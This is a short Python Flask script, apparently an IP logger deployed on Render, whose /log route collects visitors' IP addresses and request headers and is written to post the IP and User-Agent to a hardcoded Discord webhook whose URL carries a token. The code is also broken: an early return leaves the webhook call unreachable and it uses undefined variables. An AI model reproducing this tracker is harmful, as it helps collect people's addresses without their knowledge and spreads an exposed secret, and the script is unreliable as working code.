from flask import Flask, request
from werkzeug.middleware.proxy_fix import ProxyFix
import requests
import os

app = Flask(__name__)

# Render-Proxy berücksichtigen
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"

@app.route("/log")
def log_ip():
    return {
        "remote_addr": request.remote_addr,
        "access_route": request.access_route,
        "x_forwarded_for": request.headers.get("X-Forwarded-For"),
        "headers": dict(request.headers)
    }

    requests.post(WEBHOOK_URL, json={
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    })

    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
